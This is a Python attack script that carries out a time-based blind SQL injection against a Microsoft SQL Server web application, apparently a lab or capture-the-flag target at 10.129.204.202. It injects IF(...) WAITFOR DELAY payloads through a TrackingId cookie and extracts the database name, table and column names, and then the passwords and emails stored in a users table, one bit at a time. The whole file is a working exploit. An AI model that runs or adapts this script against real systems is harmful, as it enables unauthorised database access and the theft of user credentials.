#!/usr/bin/python3

import requests
import time
import urllib.parse

# Define the length of time (in seconds) the server should wait if `q` is `true`
DELAY = 2

# Proxy settings
proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


# Evaluates `q` on the server side and returns `true` or `false`
def oracle(q):
    start = time.time()
    encoded_q = urllib.parse.quote(str(q))
    encoded_delay = urllib.parse.quote(str(DELAY))
    cookie_value = (
        "PHPSESSID=ngt1kebjk37g1harvvajrc22dj; "
        "TrackingId=e1181edd7596410e9602d91dfa1daa52"
        "%27%3BIF(" + encoded_q + ")%20WAITFOR%20DELAY%20%270%3A0%3A" + encoded_delay + "%27--"
    )
    r = requests.get(
        "http://10.129.204.202/",
        headers={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Cookie": cookie_value
        },
        proxies=proxy
    )
    return time.time() - start > DELAY


# Dump a number
def dumpNumber(q):
    length = 0
    for p in range(7):
        if oracle(f"({q})&{2**p}>0"):
            length |= 2**p
    return length


# Dump a string
def dumpString(q, length):
    val = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
        print(chr(c), end='', flush=True)
    return val


## STEP 0
def step0():
    # Dump the length of dbname
    db_name_length = dumpNumber("LEN(DB_NAME())")
    print(f"[*] DB name length = {db_name_length}")
    # [*] DB name length = 3

    # Dump the name of db
    print("[*] DB name = ", end='', flush=True)
    db_name = dumpString("DB_NAME()", db_name_length)
    print()
    # print(f"[*] DB name = {db_name}")
    # [*] DB name = d4y


## STEP 1
def step1():
    # Dump the num of tables
    num_tables = dumpNumber("SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='d4y'")
    print(f"[+] Num of tables = {num_tables}")

    # Dump the name of tables
    for i in range(num_tables):
        table_name_length = dumpNumber(f"select LEN(table_name) from information_schema.tables where table_catalog='d4y' order by table_name offset {i} rows fetch next 1 rows only")
        print(f"[+] Table {i} name length = {table_name_length}")
        print(f"[+] Table {i} name = ", end='', flush=True)
        table_name = dumpString(f"select table_name from information_schema.tables where table_catalog='d4y' order by table_name offset {i} rows fetch next 1 rows only", table_name_length)
        print()
        # print(f"[+] Table {i} name = {table_name}")


## STEP 2
def step2():
    # Get the number of columns in the 'users' table
    num_columns = dumpNumber("select count(column_name) from INFORMATION_SCHEMA.columns where table_name='users' and table_catalog='d4y'")
    print(f"[-] Num of columns = {num_columns}")

    # Dump the name of columns
    for i in range(num_columns):
        column_name_length = dumpNumber(f"select LEN(column_name) from INFORMATION_SCHEMA.columns where table_name='users' and table_catalog='d4y' order by column_name offset {i} rows fetch next 1 rows only")
        print(f"[-] Column {i} name length = {column_name_length}")
        print(f"[-] Column {i} name = ", end='', flush=True)
        column_name = dumpString(f"select column_name from INFORMATION_SCHEMA.columns where table_name='users' and table_catalog='d4y' order by column_name offset {i} rows fetch next 1 rows only", column_name_length)
        print()
        # print(f"[-] Column {i} name = {column_name}")


## STEP 3
def step3():
    # Get the number of rows in the 'password' column
    num_rows = dumpNumber("SELECT COUNT(password) FROM d4y.dbo.users")
    print(f"[-] Num of rows = {num_rows}")

    # Dump the value of the row
    for i in range(num_rows):
        # Dump the password column
        row_value_length = dumpNumber(f"SELECT LEN(password) FROM d4y.dbo.users ORDER BY password OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
        print(f"[-] Row {i} value length = {row_value_length}")
        print(f"[-] Row {i} value = ", end='', flush=True)
        row_value = dumpString(f"SELECT password FROM d4y.dbo.users ORDER BY password OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", row_value_length)
        print()
        # print(f"[+] Row {i} value = {row_value}")
        

## STEP 4
def step4():
    # Get the number of rows in the 'email' column
    num_rows = dumpNumber("SELECT COUNT(email) FROM d4y.dbo.users")
    print(f"[-] Num of rows = {num_rows}")

    # Dump the value of the row
    for i in range(num_rows):
        # Dump the password column
        row_value_length = dumpNumber(f"SELECT LEN(email) FROM d4y.dbo.users ORDER BY password OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
        print(f"[-] Row {i} value length = {row_value_length}")
        print(f"[-] Row {i} value = ", end='', flush=True)
        row_value = dumpString(f"SELECT email FROM d4y.dbo.users ORDER BY password OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", row_value_length)
        print()
        # print(f"[+] Row {i} value = {row_value}")


# step0()
# step1()
# step2()
# step3()
step4()